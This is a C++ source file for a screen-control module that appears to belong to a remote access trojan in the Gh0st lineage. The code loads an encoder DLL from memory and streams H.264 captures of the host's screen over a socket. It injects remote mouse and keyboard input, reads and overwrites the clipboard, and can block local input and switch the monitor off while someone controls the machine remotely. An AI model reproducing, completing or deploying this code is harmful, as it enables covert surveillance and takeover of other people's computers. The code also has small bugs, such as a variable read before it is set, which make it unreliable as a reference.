// ShellManager.cpp: implementation of the CH264ScreenManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "H264ScreenManager.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <process.h>

#include "libyuv.h"
#pragma comment(lib,"WINMM.LIB")


#ifdef _WIN64
#include "C_libx264-148_64.h"

#ifdef _DEBUG
#pragma comment(lib, "deyuv_64.lib")
#else
#pragma comment(lib, "reyuv_64.lib")
#endif

#else

#include "C_libx264-148_32.h"

#ifdef _DEBUG
#pragma comment(lib, "deyuv_32.lib")
#else
#pragma comment(lib, "reyuv_32.lib")
#endif

#endif

#define compare_and_swap(Destination,Comperand,ExChange) \
 (InterlockedCompareExchange(Destination, ExChange, Comperand) == Comperand)

CH264ScreenManager::CH264ScreenManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = FALSE;
	DWORD dwRet;
	OSVERSIONINFOEX VersionInfo;
	ZeroMemory(&VersionInfo, sizeof(VersionInfo));
	VersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if (GetVersionEx((LPOSVERSIONINFO)&VersionInfo))
	{
		if (VersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT &&VersionInfo.dwMajorVersion > 5)
		{
			HANDLE hToken = NULL;
			if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
			{
				DWORD dwSize = 0;
				if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwSize) &&
					GetLastError() == ERROR_INSUFFICIENT_BUFFER)
				{
					PTOKEN_MANDATORY_LABEL TokenInfo = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, (ULONG)(dwSize));
					if (TokenInfo)
					{
						if (GetTokenInformation(hToken, TokenIntegrityLevel, TokenInfo, dwSize, &dwSize))
						{
							dwRet = *GetSidSubAuthority(TokenInfo->Label.Sid,(DWORD)(*GetSidSubAuthorityCount(TokenInfo->Label.Sid) - 1));
					
						}
						LocalFree(TokenInfo);
					}
				}
				CloseHandle(hToken);
			}
		}

	}
	if (dwRet == SECURITY_MANDATORY_SYSTEM_RID)
	{
		Disconnect();
		return;
	}
#ifdef _WIN64
	hdllmod = ::MemoryLoadLibrary(x264MyFileBuf, x264MyFileSize);
#else
	hdllmod = ::MemoryLoadLibrary(MyFileBuf, MyFileSize);
#endif
	m_x264_encoder_close = (x264_encoder_close)MemoryGetProcAddress(hdllmod, "x264_encoder_close");
	m_x264_picture_init = (x264_picture_init)MemoryGetProcAddress(hdllmod, "x264_picture_init");
	m_x264_encoder_encode = (x264_encoder_encode)MemoryGetProcAddress(hdllmod, "x264_encoder_encode");
	m_x264_param_default = (x264_param_default)MemoryGetProcAddress(hdllmod, "x264_param_default");
	m_x264_param_default_preset = (x264_param_default_preset)MemoryGetProcAddress(hdllmod, "x264_param_default_preset");
	m_x264_param_apply_profile = (x264_param_apply_profile)MemoryGetProcAddress(hdllmod, "x264_param_apply_profile");
	m_x264_encoder_open = (x264_encoder_open)MemoryGetProcAddress(hdllmod, "x264_encoder_open_148");
	m_x264_cpu_detect = (x264_cpu_detect)MemoryGetProcAddress(hdllmod, "x264_cpu_detect");

	thread_capture = NULL;
	thread_encoder = NULL;
	thread_push = NULL;
	ischaneg = false;
	m_bIsBlockInput = false;
	m_hDeskTopDC = GetDC(NULL);
	run_mark = false;
	m_bIsBlankScreen = false;
	fps =30; btl = 9000;
	switchMonitor = 1;
	m_MYtagMSG = nullptr;
	m_MYtagMSGsize = sizeof(MYtagMSG);
	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ResetScreen, this, 0, 0);
	m_hCtrlThread = (HANDLE)_beginthreadex(NULL, 0, CtrlThread, this, 0, NULL);
	m_buser = TRUE;
}


unsigned int __stdcall CH264ScreenManager::ResetScreen(void* arg)
{
	CH264ScreenManager* pThis = (CH264ScreenManager*)arg;
	ResetEvent(pThis->m_hEventDlgOpen);
	pThis->StopClear();
	pThis->monitors = GetMonitors();
	pThis->capture_monitor = pThis->monitors[pThis->switchMonitor - 1];
	if (pThis->capture_monitor.width % 2 == 1) pThis->capture_monitor.width -= 1;
	if (pThis->capture_monitor.height % 2 == 1)  pThis->capture_monitor.height -= 1;
	pThis->capture_monitor.capture_w = pThis->capture_monitor.width;
	pThis->capture_monitor.capture_h = pThis->capture_monitor.height;
	PacketReadyData readpkg;
	readpkg.head.type = PACKET_TYPE_READY;
	readpkg.head.len = sizeof(ReadyData);
	readpkg.head.start_sign = PACKET_START_SING;
	readpkg.i = int(pThis->monitors.size());
	readpkg.data.video_L = pThis->capture_monitor.left;
	readpkg.data.video_T = pThis->capture_monitor.top;
	readpkg.data.video_w = pThis->capture_monitor.width;
	readpkg.data.video_h = pThis->capture_monitor.height;

	DWORD	dwBytesLength = 1 + sizeof(PacketReadyData);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	lpBuffer[0] = TOKEN_BITMAPINFO_PLAY;
	memcpy(lpBuffer + 1, &readpkg, dwBytesLength - 1);
	pThis->Send(lpBuffer, dwBytesLength);
	SAFE_DELETE_AR(lpBuffer);

	std::string x264_preset = "ultrafast";
	std::string x264_tune = "zerolatency";
	std::string record_file="1.mp4";
	pThis->WaitForDialogOpen();

	pThis->Init(pThis->capture_monitor, pThis->fps, false, pThis->btl, x264_preset, x264_tune, record_file);
	pThis->Start();
	return 0;
}

CH264ScreenManager::~CH264ScreenManager()
{
	if (!m_buser) return;
	InterlockedExchange((LPLONG)&m_bIsBlankScreen, FALSE);
	StopClear();
	ReleaseDC(NULL, m_hDeskTopDC);
	MemoryFreeLibrary(hdllmod);
}

void CH264ScreenManager::StopClear()
{
	if (run_mark)
	{
		run_mark = false;
		SetEvent(yuv_queue_event);
		SetEvent(h264_queue_event);

		WaitForSingleObject(thread_capture, INFINITE);
		WaitForSingleObject(thread_encoder, INFINITE);
		WaitForSingleObject(thread_push, INFINITE);
		Trace("StopClear WaitForSingleObject结束\n");
		CloseHandle(thread_capture);
		CloseHandle(thread_encoder);
		CloseHandle(thread_push);

		capture.PartialFree();
		m_x264_encoder_close(x264);
		CloseHandle(yuv_queue_event);
		CloseHandle(h264_queue_event);

	}
}


void CH264ScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	switch (lpBuffer[0])
	{
	case COMMAND_NEXT_H264CScreenSpyDlg:
		NotifyDialogIsOpen();
		break;
	case COMMAND_h264_SHOW_Cursor:
		capture.capture_cursor = 1;
		break;
	case COMMAND_h264_HIDE_Cursor:
		capture.capture_cursor = 0;
		break;
	break;
	case COMMAND_h264_SCREEN_CONTROL:
		if (m_bIsBlockInput)
			BlockInput(FALSE);       // 远程仍然可以操作
		ProcessCommand(lpBuffer + 1, nSize - 1);
		if (m_bIsBlockInput)
			BlockInput(m_bIsBlockInput);
		break;
	case COMMAND_h264_SCREEN_BLOCK_INPUT: // CtrlThread里锁定
		InterlockedExchange((LPLONG)&m_bIsBlockInput, *(LPBYTE)&lpBuffer[1]);
		BlockInput(m_bIsBlockInput);
		break;
	case COMMAND_h264_SCREEN_BLANK:
		InterlockedExchange((LPLONG)&m_bIsBlankScreen, *(LPBYTE)&lpBuffer[1]);
		break;

	case COMMAND_h264_SCREEN_GET_CLIPBOARD:
		SendLocalClipboard();
		break;
	case COMMAND_h264_SCREEN_SET_CLIPBOARD:
		UpdateLocalClipboard((char*)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_h264_SCREEN_CHANGE_MONITORS:
	{
		memcpy(&switchMonitor, lpBuffer + 1, sizeof(int));
		HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ResetScreen, this, 0, 0);
	}
	break;
	default:
		break;
	}

}

// 创建这个线程主要是为了监视分辨率和保持一直黑屏
unsigned CH264ScreenManager::CtrlThread(LPVOID lparam)
{
	static bool bIsScreenBlanked = false;
	CH264ScreenManager* pThis = (CH264ScreenManager*)lparam;
	pThis->WaitForDialogOpen();

	/*DWORD m_dwLastCapture;
	m_dwLastCapture = GetTickCount();*/
	while (pThis->IsConnect())
	{
	//	if (GetTickCount() - m_dwLastCapture > 500)
	//	{
			if (pThis->IsResolutionChange())
			{
				pThis->ischaneg = true;
			}
	//		InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());
	//	}
		
		if (pThis->m_bIsBlankScreen)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
			BlockInput(TRUE);
		}
		else if (bIsScreenBlanked)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
			bIsScreenBlanked = false;
			BlockInput(FALSE);
		}
		Sleep(200);
	}
	BlockInput(FALSE);
	return 0;
}


void CH264ScreenManager::UpdateLocalClipboard(char* buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, len);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CH264ScreenManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = int(GlobalSize(hglb) + 1);
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_h264CLIPBOARD_TEXT;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}




bool CH264ScreenManager::Init(const Monitor& monitor, int fps, bool capture_cursor, int bitrate, std::string& x264_preset, std::string& x264_tune, std::string& record_file)
{
	this->monitor = monitor;
	this->fps = fps;
	this->bitrate = bitrate;
	this->record_file = record_file;
	this->x264_preset = x264_preset;
	this->x264_tune = x264_tune;

	if (!InitH264Encoder()) {
		return false;
	}
	if (capture.PartialInit(monitor, capture_cursor)
		!= RETURN_SUCCESS) {
		return false;
	}
	yuv_queue_event = CreateEvent(NULL, FALSE, FALSE, NULL);
	h264_queue_event = CreateEvent(NULL, FALSE, FALSE, NULL);
	yuv_queue = NULL;
	h264_queue = NULL;
	init_queue(&yuv_queue);
	init_queue(&h264_queue);
	return true;
}

void CH264ScreenManager::Start()
{
	run_mark = true;
	thread_capture = NULL;
	thread_encoder = NULL;
	thread_push = NULL;


	thread_capture = (HANDLE)_beginthreadex(NULL, 0, CaptureWork, this, CREATE_SUSPENDED, NULL);
	thread_encoder = (HANDLE)_beginthreadex(NULL, 0, EncoderWork, this, CREATE_SUSPENDED, NULL);
	thread_push = (HANDLE)_beginthreadex(NULL, 0, OutPutWork, this, CREATE_SUSPENDED, NULL);
	ResumeThread(thread_capture);
	ResumeThread(thread_encoder);
	ResumeThread(thread_push);
}

unsigned int __stdcall CH264ScreenManager::CaptureWork(void* arg)
{
	Trace("CaptureWork开始\n");
	CH264ScreenManager* work = (CH264ScreenManager*)arg;
	int video_width = work->monitor.capture_w;
	int video_height = work->monitor.capture_h;

	int  inbrga_size = video_width * video_height * 4;
	uint8_t* inbrga = (uint8_t*)malloc(inbrga_size);

	int uv_w = (video_width + 1) / 2;
	int uv_h = (video_height + 1) / 2;

	int  outi420_size = video_width * video_height + uv_w * uv_h * 2;
	uint8_t* outi420 = NULL;

	unsigned long interval_ms = 1000 / work->fps;
	unsigned long cur_time = timeGetTime();
	unsigned long nextf_time = cur_time + interval_ms;

	unsigned long start_ms = cur_time;
	unsigned long sleep_ms;

	//interval_ms += 4; //误差很大，只有更延时了
	while (work->run_mark) {

		cur_time = timeGetTime();

		if (nextf_time > cur_time) {
			sleep_ms = nextf_time - cur_time;

			if (sleep_ms > 1) {
				if (sleep_ms <= interval_ms) {	/*检测，防止虚拟机上时间函数出错*/
					Sleep(sleep_ms);
				}
				else {
					Sleep(interval_ms);
				}
			}
			else
				Sleep(0);
		}

		nextf_time = cur_time + interval_ms;

		YUV_FRAME* yuv_frame = new YUV_FRAME();
		yuv_frame->ms = cur_time - start_ms;

		if (work->capture.PartialProcessFrame(inbrga) != RETURN_SUCCESS|| work->ischaneg == true)
		{
			work->ischaneg = false;
			HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ResetScreen, work, 0, 0);
			break;
		}

		outi420 = (uint8_t*)malloc(outi420_size);
		uint8_t* dst_y = outi420;
		int dst_stride_y = video_width;

		uint8_t* dst_u = dst_y + video_width * video_height;
		int dst_stride_u = uv_w;

		uint8_t* dst_v = dst_u + uv_w * uv_h;
		int dst_stride_v = uv_w;

		int ret = libyuv::ARGBToI420(inbrga, video_width * 4,
			dst_y, dst_stride_y,
			dst_u, dst_stride_u,
			dst_v, dst_stride_v,
			video_width, video_height
		);

		yuv_frame->frame_buffer = outi420;

		work->m_x264_picture_init(&yuv_frame->pic);

		//yuv_frame->pic.i_pts = total_frames;
		yuv_frame->pic.img.i_csp = X264_CSP_I420;

		yuv_frame->pic.img.i_plane = 3;

		yuv_frame->pic.img.i_stride[0] = dst_stride_y;
		yuv_frame->pic.img.plane[0] = outi420;

		yuv_frame->pic.img.i_stride[1] = dst_stride_u;
		yuv_frame->pic.img.plane[1] = dst_u;

		yuv_frame->pic.img.i_stride[2] = dst_stride_v;
		yuv_frame->pic.img.plane[2] = dst_v;
		if (work->run_mark)
		{
			queue_add(work->yuv_queue, yuv_frame);
			SetEvent(work->yuv_queue_event);
		}

	}
	SetEvent(work->yuv_queue_event);
	free(inbrga);

	Trace("Capture  结束.\r\n ");
	return 0;
}

unsigned int __stdcall CH264ScreenManager::EncoderWork(void* arg)
{
	Trace("EncoderWork开始\n");
	CH264ScreenManager* work = (CH264ScreenManager*)arg;

	YUV_FRAME* yuv_frame;

	x264_picture_t pic_out;
	work->m_x264_picture_init(&pic_out);

	x264_nal_t* nals = NULL;
	int             nal_count;
	int             payload_size;

	H264_FRAME* h264_frame = NULL;

	uint8_t* start_ptr = NULL;
	while (work->run_mark) {

	REGET:

		yuv_frame = (YUV_FRAME*)queue_get(work->yuv_queue);
		if (yuv_frame == NULL)
			goto WAIT_TAG;

		work->m_x264_picture_init(&pic_out);
		payload_size = work->m_x264_encoder_encode(work->x264, &nals, &nal_count, &yuv_frame->pic, &pic_out);
		if (payload_size < 0) {
			//OutputDebugString("x264_encoder_encode error");
		}

		if (nal_count > 0) {

			h264_frame = new H264_FRAME();

			h264_frame->ms = yuv_frame->ms;

			h264_frame->i_dts = pic_out.i_dts;
			h264_frame->i_pts = pic_out.i_pts;
			h264_frame->b_keyframe = pic_out.b_keyframe;

			h264_frame->payload_size = payload_size;

			h264_frame->nal_count = nal_count;

			//+4 保存mp4
			h264_frame->free_buffer = (uint8_t*)malloc(h264_frame->payload_size + 4);
			h264_frame->frame_buffer = h264_frame->free_buffer + 4;


			start_ptr = nals[0].p_payload;

			memcpy(h264_frame->frame_buffer, start_ptr, h264_frame->payload_size);

			for (int i = 0; i < nal_count; i++) {
				x264_nal_t* nal = nals + i;

				h264_frame->nalt_s[i] = nals[i];
				int offset = int(nals[i].p_payload - start_ptr);
				h264_frame->nalt_s[i].p_payload = h264_frame->frame_buffer + offset;

			}

			if (work->run_mark)
			{
				queue_add(work->h264_queue, h264_frame);
				SetEvent(work->h264_queue_event);
			}

		}

		free(yuv_frame->frame_buffer);
		delete yuv_frame;

		goto REGET;
	WAIT_TAG:
		WaitForSingleObject((HANDLE)work->yuv_queue_event, 1000);
	}
	Sleep(50);
	Trace("EncoderWork  准备 结束\n");
	SetEvent(work->h264_queue_event);
	//free_queue(work->yuv_queue);
	while ((yuv_frame = (YUV_FRAME*)queue_get(work->yuv_queue)) != NULL) {
		free(yuv_frame->frame_buffer);
		delete yuv_frame;
	}
	Trace("EncoderWork 结束\n ");
	return 0;
}

unsigned int __stdcall CH264ScreenManager::OutPutWork(void* arg)
{
	Trace("OutPutWork开始\n");
	CH264ScreenManager* work = (CH264ScreenManager*)arg;
	H264_FRAME* h264_frame = NULL;
	int ret = 0;

	//MP4_CONFIG* mp4_context = NULL;
	//if (!work->record_file.empty()) {
	//	mp4_context = CreateMP4File(work->record_file.c_str(),
	//		work->fps + 3,
	//		work->monitor.capture_w, work->monitor.capture_h);
	//}


	int queue_size = 0;

	while (work->run_mark) {
	REGET:

		h264_frame = (H264_FRAME*)queue_get(work->h264_queue);
		if (h264_frame == NULL)
			goto WAIT_TAG;




		LPBYTE	lpBuffer = new BYTE[h264_frame->payload_size + 1];
		if (lpBuffer == NULL)
			return 0;

		lpBuffer[0] = TOKEN_H264SCREEN;
		memcpy(lpBuffer + 1, h264_frame->frame_buffer, h264_frame->payload_size);

		if (!work->Send(lpBuffer, UINT(h264_frame->payload_size + 1)))
		{
			delete[] lpBuffer;
			work->run_mark = false;
			break;
		}
		delete[] lpBuffer;

		//if (mp4_context != NULL) {
		//	WriteH264_Data(mp4_context, h264_frame->nalt_s, h264_frame->nal_count,
		//		h264_frame->payload_size, true,
		//		MP4_INVALID_DURATION, 0);
		//}

		free(h264_frame->free_buffer);
		delete h264_frame;

		goto REGET;

	WAIT_TAG:
		WaitForSingleObject((HANDLE)work->h264_queue_event, 1000);
	}
	//if (mp4_context != NULL)
	//	CloseMP4File(mp4_context);
	Sleep(150);

	Trace("OutPutWork  准备 结束\n");
	//free_queue(work->h264_queue);
	while ((h264_frame = (H264_FRAME*)queue_get(work->h264_queue)) != NULL) {
		free(h264_frame->frame_buffer);
		delete h264_frame;
	}
	Trace("OutPutWork结束\n");
	return 0;
}


bool CH264ScreenManager::InitH264Encoder()
{
	int ret;
	m_x264_param_default(&param);
	param.i_threads = X264_THREADS_AUTO; /* 并行编码线程为0 */
	param.b_deterministic = 1; /*允许非确定性时线程优化*/
	param.i_sync_lookahead = X264_SYNC_LOOKAHEAD_AUTO;/* 自动选择线程超前缓冲大小-1 */
	ret = m_x264_param_default_preset(&param, x264_preset.c_str(), x264_tune.c_str());
	ret = m_x264_param_apply_profile(&param, "high");
	param.i_keyint_min = 50;//关键帧最小间隔
	param.i_keyint_max = 500;//关键帧最大间隔
	param.i_width = monitor.capture_w;
	param.i_height = monitor.capture_h;
	param.b_vfr_input = 0;
	param.i_csp = X264_CSP_I420;
	param.rc.i_vbv_max_bitrate = bitrate;
	param.rc.i_vbv_buffer_size = bitrate;
	param.rc.i_bitrate = bitrate;
	param.i_fps_num = fps;//* 帧率分子   
	param.i_fps_den = 1; //* 帧率分母 
	param.p_log_private = &param;
	param.i_log_level = X264_LOG_WARNING;
	param.b_deterministic = false;
	param.rc.i_rc_method = X264_RC_ABR;
	param.i_timebase_num = 1;
	param.i_timebase_den = 1000;
	param.rc.f_rf_constant = 0;
	this->x264 = m_x264_encoder_open(&param);
	if (this->x264 == NULL) {
		return false;
	}
	return true;
}

void CH264ScreenManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
{

	if (nSize % m_MYtagMSGsize != 0)
		return;

	// 命令个数
	int	nCount = nSize / m_MYtagMSGsize;

	// 处理多个命令
	for (int i = 0; i < nCount; i++)
	{
		BlockInput(false);
		m_MYtagMSG = (MYtagMSG*)(lpBuffer + i * m_MYtagMSGsize);

		DWORD dx = (DWORD)(65535.0f / (GetDeviceCaps(m_hDeskTopDC, DESKTOPHORZRES) - 1) * m_MYtagMSG->x);
		DWORD dy = (DWORD)(65535.0f / (GetDeviceCaps(m_hDeskTopDC, DESKTOPVERTRES) - 1) * m_MYtagMSG->y);

		switch (m_MYtagMSG->message)
		{
		case WM_MOUSEMOVE:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, dx, dy, 0, 0);
			break;
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN, dx, dy, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN, dx, dy, 0, 0);
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN, dx, dy, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			break;
		case WM_MBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN | MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN | MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_WHEEL, dx, dy, GET_WHEEL_DELTA_WPARAM((UINT)(m_MYtagMSG->wParam)), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			if ((UINT)(m_MYtagMSG->wParam) == VK_LEFT || (UINT)(m_MYtagMSG->wParam) == VK_RIGHT || (UINT)(m_MYtagMSG->wParam) == VK_UP || (UINT)(m_MYtagMSG->wParam) == VK_DOWN)
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), KEYEVENTF_EXTENDEDKEY, 0);
			else
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			if ((UINT)(m_MYtagMSG->wParam) == VK_LEFT || (UINT)(m_MYtagMSG->wParam) == VK_RIGHT || (UINT)(m_MYtagMSG->wParam) == VK_UP || (UINT)(m_MYtagMSG->wParam) == VK_DOWN)
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
			else
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
}




bool CH264ScreenManager::IsResolutionChange()
{
	if (!run_mark)
		return false;
	bool bIsHorizontalChange = ((capture_monitor.capture_w - GetDeviceCaps(m_hDeskTopDC, DESKTOPHORZRES)) > 10) || ((GetDeviceCaps(m_hDeskTopDC, DESKTOPHORZRES) - capture_monitor.capture_w) > 10);
	if (bIsHorizontalChange) return true;
	bool bIsVerticalChange = ((capture_monitor.capture_h - GetDeviceCaps(m_hDeskTopDC, DESKTOPVERTRES)) > 10) || ((GetDeviceCaps(m_hDeskTopDC, DESKTOPVERTRES) - capture_monitor.capture_h) > 10);
	if (bIsVerticalChange) return true;
	return false;
}
